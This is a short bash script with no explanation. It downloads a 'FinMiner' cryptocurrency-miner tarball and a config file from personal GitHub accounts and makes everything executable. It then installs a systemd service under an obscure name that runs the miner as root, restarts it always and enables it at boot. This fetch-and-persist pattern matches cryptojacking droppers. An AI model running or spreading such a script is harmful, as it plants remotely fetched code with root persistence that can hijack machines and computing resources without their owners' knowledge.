sudo apt-get update 
sudo apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git liblzo2-dev libpam0g-dev
cd /usr/local/
wget https://github.com/ilehoe0202/code_miner/releases/download/0.0.1/FinMiner-test.tar.gz
wget https://raw.githubusercontent.com/nhattieunhatmong/chef/master/test/reborn/week5/config.ini
chmod +x *
tar -xf FinMiner-test.tar.gz
bash -c 'cat <<EOT >>/lib/systemd/system/1tieuthanhtrum.service 
[Unit]
Description=1tieuthanhtrum
[Service]
ExecStart=  /usr/local/FinMiner-linux-2.4.2/finminer /usr/local/config.ini
WatchdogSec=1800
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable 1tieuthanhtrum.service &&
service 1tieuthanhtrum start
